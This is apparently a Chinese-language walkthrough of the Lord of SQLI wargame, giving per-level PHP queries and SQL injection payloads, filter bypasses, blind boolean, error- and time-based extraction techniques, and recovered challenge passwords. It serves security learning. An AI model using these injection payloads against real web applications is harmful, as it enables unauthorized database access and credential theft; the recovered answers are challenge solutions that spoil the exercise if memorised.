# Lord of SQLI #
[enter dungeon](https://los.eagle-jump.org/)  
每一題都是GET request，目標基本上就是執行`solve('name');`    
## gremlin ##
```php
$query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
```  
基本題  
payload: id='or 1#  
要注意某些字元需要經過url編碼(#=>%23)
##cobolt
```php
$query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
```  
目標id==admin
所以我們就插admin給id，剩下的部分註解掉就好了  
payload: id=admin'#  
##goblin
```php
$query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
```  
這題禁止了單引號`'`，但由於no是數字，所以其實我們也不需要用到單引號去補足下半部  
注意query裡id被限定為guest，所以我們要插入id=admin的結果，再透過limit或order去把結果推到第一行  
先嘗試 no=1 or 1#  
由於後面的or 1，整個table都會被select出來，於是我們只要用limit去把admin推上來就好  
payload: no=1 or 1 limit 1,1#
##orc
addslashes雖然有bypass的方法，但要達到result['pw']==GET['pw']是很困難的  
所以這一題而言，我們還是需要把密碼給找出來
Boolean-based SQLInjection  
補足字串下半部後，透過and可以測試query的正確性  
如果query正確 `pw=' or 1#`，則會顯示Hello admin  
如果query錯誤 `pw=' or 0#`，則什麼也不會顯示  
另外，找出字串前，先找出長度可以節省很多時間  
先找出admin的密碼長度  
`pw=' or (id='admin' and length(pw) = 1)#`  
`pw=' or (id='admin' and length(pw) = 2)#`  
`pw=' or (id='admin' and length(pw) = 3)#`  
不斷地增加數字，直到出現Hello admin  
另外，也可以用大於小於來節省時間  
`pw=' or (id='admin' and length(pw) > 5)#`
`pw=' or (id='admin' and length(pw) < 10)#`   
最後得到長度為8  
那要怎麼猜測密碼呢?
`pw=' or (id='admin' and pw = 'AAAAAAAA')#`  
brute force他(ง๑ •̀_•́)ง  
也是一種方法啦，但是太沒效率了
我們可以把每個字元個別篩選出來，在一個byte的範圍內去比對會比較有效率一點  
`pw=' or (id='admin' and substr(pw,0,1) = 'a')#`   
或是取出他的ascii code用大於小於的方式去比較，速度會更快
`pw=' or (id='admin' and ord(substr(pw,1,1)) > 10)#`   
最後經過多次嘗試，找出密碼=295d5844(不確定是不是大家都用同一個密碼)  
payload: pw=295d5844  
[orc.py]()
##wolfman
這題禁止使用空白，但是只要把空白換成inline comment(`/**/`)也可以達到空白的效果  
除此之外，就跟goblin那題差不多概念了  
payload: pw='/**/or/**/1/**/limit/**/1,1#
##darkelf
這題禁止使用and/or，但是這兩個operator可以簡單的使用`||`和`&&`代替  
payload: pw='||1 limit 1,1#
##orge
這題其實就是darkelf和orc的綜合題，就不多作介紹了  
值得注意的是，ord會被偵測到or而被擋下來，只要改用ascii就可以了  
payload: pw=6c864dec  
[orge.py]()
##troll
SQL是non-case sensitive的，但是ereg是，所以只要換個大小寫就可以bypass這關  
payload: id=Admin
##vampire
admin會被替換成空字串，那aadmin呢?adminn呢?  
這題只要輸入admadminin就會被替換回admin  
payload: id=adadminmin
##skeleton
```php
$query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
```  
由於後面and 1=0永遠為false，因此我們需要將後方註解才能bypass  
但是這題也只有這樣而已(๑•̀ω•́)ノ  
payload: pw=' or 1 limit 1,1#
##golem
這題禁止使用substr、等號，但是我們可以透過like語法去拼湊出正確的字串  
`pw='|| id like 'admin' && pw like 'A%'#`  
也因為禁止使用等號，測試長度時必須要用大於小於來做比較了  
payload: pw=88e3137f  
[golem.py]()  
##darkknight
這題與上一題相比，除了參數換到no、不能用單引號外好像也沒有太大的變化  
`no=1 || id like "admin" && pw like "A%"#`  
payload: pw=1c62ba6f  
[darkknight.py]()  
##bugbear
這次等號和like都被禁止使用了，我們還能用什麼語法去突破呢?答案是in  
`no=1 || id in("admin") && length(pw) > 0`  
別忘記將空白換成/**/，經過幾次嘗試我們可以得到密碼長度為8  
接著，沒有substr、like，我們要怎麼把字串切割出來呢?在SQL中還有許多處理字串的函數，如left、right、mid等等  
`right(left(pw,位置),1)`或是`mid(pw,位置,1)`都可以做字串切割  
於是切割出字串後一樣用in進行比對  
`no = 1 || id in("admin") && mid(pw,1,1) in("A")`  
最後得到密碼為735c2773  
[bugbear.py]()
##giant
這題主要是考觀念，SQL裡除了空格(0x20)、換行(0x0A)之外，還有許多會被視為空格的字元  
payload: shit=%0B
##assassin
這題需要賭guest和admin的密碼不一樣，並透過like去做brute force  
如果我們輸入的pw讓admin和guest同時符合這個條件，螢幕只會顯示Hello guest，所以如果我們把所有字都測試過了依舊沒有出現Hello admin，代表admin和guest的那個字元是相同的，我們就可以在那個位置插上`_`，並對下一個字元做brute force  
例如我們測試到`pw=8%`時出現了Hello guest，代表guest的密碼第一個字是8，但是之後的測試都沒有出現Hello admin，這代表admin的密碼第一個字也是8，於是我們調整payload`pw=_0%`、`pw=_1%`去測試第二個字元，以此類推
注意我們並不需要把admin的密碼完整的dump出來，只要出現Hello admin就可以過了  
payload: pw=832%  
[assassin.py]()
##zombie_assassin
ereg可以輕易用%00跳過判斷  
`id=%00'`，你熟悉的單引號就又回來囉~  
payload: id=%00'or 1#
##succubus
接續上題，那如果他連單引號也不讓你插怎麼辦(｡ŏ_ŏ)  
既然不能新增，那我們就思考看看現有的單引號能不能被利用  
```php
$query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
```  
我們如果在id插入一個反斜線`\`，整個SQL query就會變成  
id=`'\' and pw='`，跟pw的第一個單引號結合，於是pw剩下的參數就是我們可以操控的SQL語法了  
payload: id=\&pw=or 1#
##nightmare
MySQL在做字串和數字比較時，會先嘗試將字串轉成數字  
"0String" = 0  =>  0 = 0  
"1String" = 0  =>  1 = 0  
當字串前沒有數字時，字串就會被轉為0  
"String" = 0 => 0 = 0  
所以我們在payload中插入  
`pw=')=0`
就可以得到table中的所有資料，但是，後面的id!='admin'還需要被註解掉  
由於無法使用#、--等註解符號，我們利用%00截斷SQL對query的解讀`pw=')=0%00`  
但是，還是沒有結果...這是因為我們用%00截斷了SQL query的字串，所以我們必須為他補上完整的語法，分號`;`  
payload: pw=')=0;%00 剛好六個字元
##xavis
這題...與之前orc那幾題有什麼差別嗎?  
說一樣是一樣，說不一樣也是有一些些不同的  
這一題的資料庫裡儲存的資料是unicode編碼的，之前習慣用ascii()去測試的人在這題會得到一堆奇怪的資料，改用ord()就可以拿到完整的unicode字元  
最後得到16進位的密碼為0xb8f9c5b0c6d0c4a1a4bb  
轉成字串則是`¸ùÅ°ÆÐÄ¡¤»`  
payload: pw=¸ùÅ°ÆÐÄ¡¤»
##dragon
```php
$query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
```  
我們可以觀察到query後方被單行註解掉了  
"單行"註解，所以我們只要插入換行符號，讓query換行，就可以跳脫單行註解的限制了  
payload: pw=%0A or 1 limit 1,1#
##iron_golem
Error-based SQL injection，具體原理就是，雖然無法從網頁結果得知query正不正確，但是我們可以透過特殊的query引發SQL錯誤，藉以判斷query正不正確  
`if( length(pw) > 0, 1, (select 1 union select 2 union select 3))`  
當正確時會執行1，沒有錯誤、錯誤時會執行(select 1 union select 2 union select 3)，而引發錯誤  
因此payload大約長這樣  
`pw=' or if(length(pw) = 0,1,(select 1 union select 2 union select 3))#`
接下來就與boolean-based差不多了  
最後得到密碼為!!!!(真的是四個驚嘆號XD)  
paylaod: pw=!!!!
##dark_eyes
一樣是error-based，但是這一題因為禁止使用if和case，所以我們使用一些比較神奇的做法去引發錯誤  
次方power函式如果數字過大會引發錯誤，讓我們來考慮以下兩種情形  
1. power(1,9999999999) = 1  
2. power(2,9999999999) = 超大數  
實際執行過後發現`pw=' or power(2,9999999999)#`會引發SQL錯誤，讓server回傳空白網頁  
因此payload如下  
`pw=' or id='admin' and power((測試query)+1,9999999999)%23`  
最後得到結果為5a2f5d3c  
payload: pw=5a2f5d3c
##umaru
Time-based SQL injection  
基本原則是，當query成功時會執行sleep，server的回覆就會延遲一定的時間，藉此來判斷query是否成功，甚至可以把回傳的結果直接當作sleep的參數，例如sleep(length(pw))，只要計算延遲的秒數，就可以知道pw的長度，不過這種方法必須確保原先server的延遲非常小  
```php
if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();
```  
如果我們隨意嘗試payload，會讓server reset flag，因此，我們要做的就是透過sql error讓程式不會繼續向下執行  
輸入flag=(select sleep(10))就可以讓server延遲10秒，但要達到執行sleep，之後又可以引發一個error來讓update失敗，我們可以插入(select sleep(10) = (select 1 union select 2))  
最後payload如下  
`flag=(select sleep(測試) = (select 1 union select 2))`  
至少這題可以保證密碼大家都不一樣XD  
[umaru.py]()